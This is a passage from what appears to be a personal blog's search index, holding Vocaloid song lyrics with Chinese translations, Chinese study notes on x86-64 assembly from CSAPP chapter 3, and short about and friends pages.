大人になること水を飲むこと私達が永遠じゃないこと当たり前でもそんなことでも全部キラキラしていたんだそれが18,19,20　だんだん見えなくなっていくそれが21,22…私は覚えていられるかな セブンティーンじゃ無いならもしも無くしちゃったようなら　何度だって言うよこの世界の愛し方をセブンティーンはエンドレス史上最弱で最強の私のこと思い出せばもう怖いもんなんて無いなセブンティーナ 間違ってばっかの私は間違ってばっかの私は 翻译b站官方投稿的字幕里有。没有现成的给我复制粘贴 Miku Wikiセブンティーナhttps://www5.atwiki.jp/hmiku/pages/38441.html","tags":["Vocaloid","音乐"],"categories":["兴趣爱好"]},{"title":"【GUMI】逆夢ランデヴー【なつめ千秋】","path":"/sakayumerandebu/","content":"千秋大佬昨天投了第十首术力口曲子，还是一如即往的好听啊。 曲／なつめ千秋 Twitter@cak_ntmIllust／おはぎ Twitter@ohagi_FAULHEITMovie／みず希 Twitter@mzk_i6 千秋虽然投稿不多，但是每首曲子都非常高。第一次被他圈粉是他在14年5月投稿的第四首曲子，用gumi调教的センチメンタルな愛慕心 ，这首歌到现在也是我最喜欢的V+曲之一（单画pv也很好舔），这首歌的调教真的是神了，甚至让我听着就有恋に落ちた的感觉，n站上也全是粉色弹幕。有机会真想买一张千秋的碟（虽然没办法放）。 链接 b站赫总的授权搬运 本家：nico youtube 歌词まるで意味のないレジスタンス正義も悪もないその誤魔化し喋れば喋るほど嘘がバレてしまいそうで怖じ気付いてんだろう？ バカなふりをして生きるのもそろそろ飽きてきた頃さ繋いだ指がほどける前に全て曝け出すから 同じ顔してカッコつけて飾っても頭ん中からっぽなんてダサくない？そんな薄っぺらいハートに踊らされて自惚れる自分ってどうよ？派手なピストルで目を覚ましてくれ まるで意味のないサレンダー間抜けの群がるそのまやかしやけに得意げなマジョリティーのつら 蹴り飛ばしてやろう 認められたいくせに今日だって怠けて無駄にしたんだろう？口から出任せで生きてたら時間が減ってゆくだけさ どこで誰と何しようが興味ないさわざとらしく演じちゃって寒くない？そんなつまらないハートに踊らされて悦に入る自分ってどうよ？ふざけたセリフで汚さないでくれ 誰も知らない星の海で無重力の夢とランデヴー 同じ顔してカッコつけて飾っても頭ん中からっぽなんてダサくない？そんな薄っぺらいハートに踊らされて自惚れる自分ってどうよ？ どこで誰と何しようが興味ないさわざとらしく演じちゃって寒くない？そんなつまらないハートに踊らされて悦に入る自分ってどうよ？ 安いプライドで邪魔しないでくれ 翻译：翻译来自：@弓野篤禎_うゆピギィ逆夢ランデヴー：反梦幽会 简直毫无意义的抵抗既非正义也不是恶事的那伪装感觉越说谎言就越是要暴露所以就胆怯起来了吧？ 装作傻瓜活着也该到了厌烦的时候了吧在相握的手指松开前我会将一切暴露出的啊 就算摆着同一张脸装样子粉饰着脑袋里一片空白那可不太俗了吗？被那样肤浅的内心操纵着自以为是的自己怎么样啊？让我用这华丽的手枪让你睁开双眼吧 简直毫无意义的投降傻瓜群聚的那欺骗那相当得意洋洋的多数派的嘴脸 让我都给你踢飞吧 很不想承认但今天你也是没卖力白过了吧？靠信口开河活着只会时间越来越少啊 在哪里和谁做些什么我才没兴趣啊不自然地装给别人看不觉得心寒吗？被那样无趣的内心操纵着满心欢喜的自己怎么样啊？别拿那开玩笑似的台词玷污我啊 在谁都不知晓的繁星之海与无重力之梦幽会 就算摆着同一张脸装样子粉饰着脑袋里一片空白那可不太俗了吗？被那样肤浅的内心操纵着自以为是的自己怎么样啊？ 在哪里和谁做些什么我才没兴趣啊不自然地装给别人看不觉得心寒吗？被那样无趣的内心操纵着满心欢喜的自己怎么样啊？ 别拿那廉价的自尊心打扰我啊 初音ミク Wiki逆夢ランデヴーhttps://www5.atwiki.jp/hmiku/pages/38524.html这网站更的真快啊，是有机器人吗……","tags":["Vocaloid","音乐"],"categories":["兴趣爱好"]},{"title":"简单的汇编学习笔记与总结","path":"/learning-asm/","content":"根据CSAPP第三章内容与课堂讲义总结，默认是x86-64系统，C语言。这里讨论的都是整数。因为我比较菜，写的比较垃圾，争取自己复习的时候可以看懂。 数据格式 C声明 Intel数据类型 汇编代码后缀 大小（字节） char 字节 b 1 short 字 w 2 int 双字 l 4 long 四字 q 8 char* 四字 q 8 float 单精度 s 4 double 双精度 l 8 整数寄存器 操作数类型 立即数：直接表示常数值。例子：$577, 0x1F。 寄存器：某个寄存器里的内容。例子: %rax, %ecx。 内存引用：根据计算出来的地址访问内存中的位置。例子：(%rax), (0x100)。 引用内存的多种形式 (R) : Mem[Reg[R]] : 直接访问。如：(%rax)。 D(R) : Mem[Reg[R] + D] : 访问原始地址加上偏移量后的地址。如：8(%rbp)， 访问的是 %rbp + 8 地址的值。 D(Rb, Ri, s) : Mem(Reg[Rb] + Reg[Ri] * s) : 比例变址寻址。如：4(%rax, %rdx, 4)，访问的是 %rax + %rdx * 4 + 4地址的值。 基本的汇编指令数据传送MOV类：MOV Src, Dst ：把Src上面的数据传送到Dst上 指令 描述 movb 传送字节 movw 传送字 movl 传送双字 movq 传送四字 movabsq 传送绝对四字 注意事项 常规的movq指令只能以表示为32位补码数字的立即数作为源操作数，然后把这个值扩展到64位再放到目的位置， 而movabsq指令能够以任意64位立即数值作为源操作数，并且只能以寄存器作为目的。 大多数情况中，MOV指令只会更新目的操作数指定的寄存器字节或内存位置，高位不变。唯一的例外是movl指令以寄存器作为目的时，它会把寄存器的高位4字节设置为0 传输不能从内存到内存 MOVZ和MOVS类：MOVZ/MOVS Src, Dst ：将较小的源值复制到较大的目的时使用，分别是零扩展（剩余填充0）和符号扩展（剩余填充符号位）。 零扩展： 指令 描述 movzbw 将做了零扩展的字节传送到字 mozbl 将做了零扩展的字节传送到双字 movzwl 将做了零扩展的字传送到双字 movzbq 将做了零扩展的字节传送到四字 movzwq 将做了零扩展的s字传送绝对四字 符号扩展： 指令 描述 movsbw 将做了符号扩展的字节传送到字 mosbl 将做了符号扩展的字节传送到双字 movswl 将做了符号扩展的字传送到双字 movsbq 将做了符号扩展的字节传送到四字 movswq 将做了符号扩展的字传送绝对四字 movslq 将做了符号扩展的双字传送到四字 cltq 把%eax符号扩展到%rax 注意：cltq指令只能作用于寄存器%eax和%rax数据传输的例子： 第一个例子 12345movabsq $0x0011223344556677, %rax # %rax = 0x0011223344556677movb $-1, %al # %rax = 0x00112233445566FFmovw $-1, %ax # %rax = 0x001122334455FFFFmovl $-1, %eax # %rax = 0x00000000FFFFFFFFmovq $-1, %rax # %rax = 0xFFFFFFFFFFFFFFFF 2.第二个例子 12345movabsq $0x0011223344556677, %rax # %rax = 0x0011223344556677movb $0xAA, %dl # %dl = 0xAAmovb %dl, %al # %rax = 0x00112233445566AAmovsbq %dl, %rax # %rax = 0xFFFFFFFFFFFFFFAAmovzbq %dl, %rax # %rax = 0x00000000000000AA 压入和弹出栈数据 push src：把数据压入栈中 pop dst：抽出栈顶数据 注意： 以上操作是通过寄存器%rsp中所存地址指向栈顶。抽出栈顶数据后，原来的数据保持在原来的内存位置中，直到被覆盖。这里的相关内容还没细讲，以后再补吧。 加载有效地址leaq指令： leaq Src, Dst：直接将有效地址（即：把括号内的值，不读入对应内存的数据）写入到目的。leaq可以简洁地描述普通的算术操作例如： 1leaq 7(%rdi, %rsi, 4), %rax # 设%rdi总存数据x，%rsi中存数据y，则这条指令是将 x+4y+7 存入%rax中 其他算术和逻辑操作这里先简单的给出这些操作： 指令 描述 inc D D = D + 1 dec D D = D - 1 neg D D = -D not D D = ~D add S,D D = D + S sub S,D D = D - S imul S,D D = D * S xor S,D D = D ^ S or S,D D = D &#124; S and S,D D = D &amp; S sal k,D D = D &lt;&lt; k shl k,D D = D &lt;&lt; k sar k,D D = D &gt;&gt;算术k shr k,D D = D &gt;&gt;逻辑k (注意到sal和shl是一样的，因为左移不会涉及符号位) 移位操作移位操作对w位长的数据值进行操作，移位量是有%cl寄存器的低m位决定的，这里2m=w，剩余高位会被忽略。所以，例如当寄存器%cl是十六进制值为0xFF(11111111)时，指令salb会移7位(111，二进制3位)，salw会移15位(1111，二进制4位)，sall会移31位(11111，二进制5位)，salq会移63位(111111，二进制5位)。 这些位数也是对应指令能移动的最高位数。 这里来举个例子：一个32位的int数1，移动n=34位，计算1&lt;&lt;n，因为(34)10=(100010)2 取前五位00010，即2。所以1&lt;&lt;34等价于1&lt;&lt;2=4。其实就是让n mod 32(2m)。 所以习题3.60中 1salq %cl, %rdx # %ecx中的值为n，%rdx中的值是mask 所以这条语句的作用是 mask = mask &lt;&lt; n，并不用截取%rcx的前八位(n &amp; 0xFF)，直接移动n为即可，因为salq最多移63位(11111)，n太大了也会被截成64以下（只取n二进制下的前6位）。 特殊算术操作 1.一个操作数从上面的表我们可以看到，乘（mul和imul）和除（div和idiv）都是二元操作。这样的操作是在同位数数据采用的，比如：如果你用imulq S,D指令，则代表你计算的内容是一个64位数乘一个64位数并得到一个64位数。我们在前面的学习中便知道，w位数乘w位数会先得到一个2w位数，然后再截取前w位得到最后的结果。但如果你想得到就是那个2w位数，以w=64位例，计算机会将其处理未这样的汇编指令：imulq S。这条指令的效果是：R[%rdx]:R[%rax]&lt;–S/R[%rax]，即把S中的数与%rax中的数做补码乘法后，*将乘积的高64位存在%rdx中，低64位存在%rax中。 当操作为无符号操作mulq S时同理。这里有一个两个无符号64位数乘法得到无符号128位数的例子：C语言代码为： 123void store_uprod(uint128_t *dest, uint64_t x, uint64_t y)&#123; *dest = x * (uint128_t)y;&#125; 他的汇编代码为： 123456store_uprod: movq %rsi, %rax mulq %rdx movq %rax, (%rdi) movq %rdx, 8(%rdi) # 小端机器 ret 以64位为例，对于除法idivl S，他会把R[%rdx]:R[%rax]作为被除数（128位），S为除数，将结果的商存在%rax中，余存在%rdx中。如果被除数是64位，则%rdx中全为0（无符号位）或全为%rax的符号位（有符号运算），这两个操作可以用cqto（R[%rdx]:R[%rax]&lt;–R[%rax]完成。 对于64位以下的操作mulb / mulw / mull，一元乘除操作也是同理，另一个源操作数会隐含在R[%al] / R[%ax] / R[%eax]中，结果存在R[%ax] / R[%dx]:R[%ax] / R[%edx]:R[%eax]中，除法同理。还需要注意一点的是有符号乘法，若要取2w位应该采用“布斯乘法”，也就是习题2.75让我们推导的计算两个w位补码运算结果的高w位（一共2w位）的方法：(x, y表示有符号数，x’,y’表示与其二进制表示相同的无符号数) (x’ * y’)高w位 = (x * y)高w位 + x * y的符号位 + y * x的符号位 此公式的推导思路源于教材公式2.18。例子：无符号数0xB4 (180) 乘 无符号数0x11 (17) 结果为0xBF4 (3060)。有符号数0xB4(-76) 乘 有符号数0x11 (17) 结果为0xFAF4 (-1292) ，并非(0xBF4)。(0xB=(0xFA+0x11) mod 64) 2.三个操作数指令： MUL Imm, Src, Reg功能：将Src和立即数Imm相乘，结果存在Reg中。例子：R[%eax] = 0xB4, R[%ebx] = 0x11, M[0xF8] = 0xA0，执行指令imull $-16, (%eax, %ebx, 4), %eax的效果：R[%eax]&lt;– (-16) x M[R[%eax] + R[%ebx] x 4] = (-16) x M[0xB4 + 0x11 &lt;&lt; 2] = (-16) x M[0xF8] = (-16) x 0xA0 = 0xFFFFFF60 &lt;&lt; 4（做一个补码操作去除负号）= 0xFFFFF600 = -2560 整数乘除指令总结 乘法 一个操作数若给出一个操作数Src，则另一个源操作数隐含在R[%al] / R[%ax] / R[%eax]中，将Src和前述寄存器（累加器accumulate）中内容相乘，结果存放在R[%ax]（16位）/ R[%dx]:R[%ax]（32位）/ R[%edx]:R[%eax]（64位）中。 两个操作数MUL Src, Dst : Dst&lt;–Dst MUL Src 三个操作数MUL Imm, Src, Reg : Reg&lt;–Imm MUL Src 除法 除数为8位，则16位被除数在R[%ax]中，商送回R[%al]，余数在R[%ah] 除数为16位，则32位被除数在R[%dx]:R[%ax]中，商送回R[%ax]，余数在R[%dx] 除数为32位，则64位被除数在R[%edx]:R[%eax]中，商送回R[%eax]，余数在R[%edx] 除数为64位，则128位被除数在R[%rdx]:R[%rax]中，商送回R[%rax]，余数在R[%rdx] 控制指令在下面介绍 其他操作输入输出指令(IN, OUT)和标志传送指令(PUSHF, POPF)等还没细讲，以后再补。 控制条件码除了整数寄存器，CPU还维护着一组单个位的条件码寄存器，他们描述了最近的算术或逻辑操作的属性。可以检测这些寄存器来执行条条件分支指令。最常用的条件码有： CF：进位标志。最近的操作使最高位产生了进位（加分有进位（carry），减法有借位（borrow））。可以用来检查无符号操作的溢出。 ZF：零标志。最近的操作得出结果为0。（所有位上数字都是0） SF：符号标志。最近的操作得到的结果为负数。 OF：溢出标志。最近的操作导致一个补码溢出——正溢出或负溢出。(如y……+y……=z……，或y…….-z……=z…… 「其中z=~y」等) 定点算术运算和逻辑运算对条件码的影响 ADD：影响OF, ZF, SF, CF。 SUB：影响OF, ZF, SF, CF。有借位，即减数&gt;被减数，则CF=1。两个数符号相反但结果符号与减数相同，则OF=1 INC：影响OF, ZF, SF。注意：不会影响CF，也就是说不会产生进位信息 DEC：影响OF, ZF, SF。注意：同INC NEG：影响OF, ZF, SF, CF。相当于用0减操作数或者取反+1，OF变化同减法（所以只有当操作数为100…0时，OF才会变为1） CMP：影响OF, ZF, SF, CF。 MUL：只影响OF, CF。乘积高一半为0，则CF=OF=0，否则是1。 IMUL：只影响OF, CF。乘积高一半为低一半的符号扩展，则CF=OF=0，否则是1。 DIV, IDIV：不影响上述条件码。 AND, OR, XOR, TEST：都会使OF和CF变为0，ZF和SF根据结果设置。 NOT：不影响标志 SHL, SHR, SAL, SAR, ROL, ROR：CF=移入的数值，ZF和SF根据结果设置，如果最高位变化，则OF=1，否则为0。 参考链接 例子：R[%ax]=0xFFFA, R[%bx]=0xFFF0，执行指令（Intel格式）add ax bx：R[%ax]&lt;–R[%ax] + R[%bx] = 0xFFFA + 0xFFF0 = 0xFFEA, R[%bx]中内容不变，CF = 1, OF = 0, ZF = 0, SF = 1。对于上述例子，若是无符号整数运算，则CF=1说明结果溢出。若是有符号整数运算，OF=0说明结果没有溢出。 比较和控制指令这两种指令不修改任何寄存器的值，只设置条件码 CMP (cmpb, cmpw, cmpl, cmpq)CMP S1, S2：就是计算S2 - S1，以设置条件码得以看出比较的结果。 CF = 1: 发生了进位或借位（这里做减法一般是借位，借位了就表明S2 &lt; S1） ZF = 1: S1 = S2 SF = 1: S2 - S1 &lt; 0（补码运算意义上的） OF = 1: (a &gt; 0 &amp;&amp; b &lt; 0 &amp;&amp; (a - b) &lt; 0) || (a &lt; 0 &amp;&amp; b &gt; 0 &amp;&amp; (a - b) &gt; 0) TEST (testb, testw, testl, testq)TEST S1, S2：就是计算S1 &amp; S2，以设置条件码。 ZF = 1: S1 &amp; S2 = 0 SF = 1: S1 &amp; S2 &lt; 0（补码运算意义上的）经常使用这个指令测试一个数是不是负数：testq %rax, %rax 设置指令SET类的指令可以将一个字节的值设置为条件码的某种组合，这种指令的目的操作数是低位单字节寄存器之一或一个字节的内存位置（如%al），一般是配合比较和测试指令使用，下面列出常用的SET类指令： 指令 同义名 效果 设置条件 sete D setz D &lt;– ZF 相等/零 setne D setnz D &lt;– ~ZF 不等/非零 sets D D &lt;– SF 负数 setns D D &lt;– ~SF 非负数 setg D setnle D &lt;– ~(SF ^ OF) &amp; ~ZF 有符号&gt; (greater) setge D setnl D &lt;– ~(SF ^ OF) 有符号 &gt;= setl D setnge D &lt;– SF ^ OF 有符号&lt; setle D setng D &lt;– (SF ^ OF) &#124; ZF 有符号&lt;= seta D setnbe D &lt;– ~CF &amp; ~ZF 无符号&gt; (above) setae D setnb D &lt;– ~CF 无符号&gt;= setb D setnae D &lt;– CF 无符号&lt; (below) setbe D setna D &lt;– CF &#124; ZF 无符号&lt;= 下面是一个例子：设C函数： 1234int compare(long x, long y)&#123; return x &gt; y;&#125; 其汇编代码为： 12345compare: # x in %rdi, y in %rsi cmpq %rsi, %rdi # compute x - y setg %al # 大于则设置为1，否则为0 movzbl %al, %eax # 这项操作是使 %eax(and %rax) 上其他位的数据全部清空为0，保证返回数据只为%al上的数据 ret 跳转指令等讲了再补 未完待续未完待续……","tags":["汇编"],"categories":["课程学习"]},{"title":"关于我","path":"/about/index.html","content":"I’m RinChanNOW。一个术术人、游戏玩家。PC 与 PS4 游戏均有涉猎，最近沉迷音乐游戏。主要游玩初音未来歌姬计划与 SOUNDVOLTEX，不过两者都技艺不精。歌姬计划（AFT、FTDX）：只能 PERFECT 部分 8 星曲目，9 星苦手，10 星根本不敢碰。SDVX： (TODO: 在线生成这两个图标)文章GitHub友链"},{"path":"/friends/index.html","content":"友情链接董老师滑稽仓库JmPotato"}]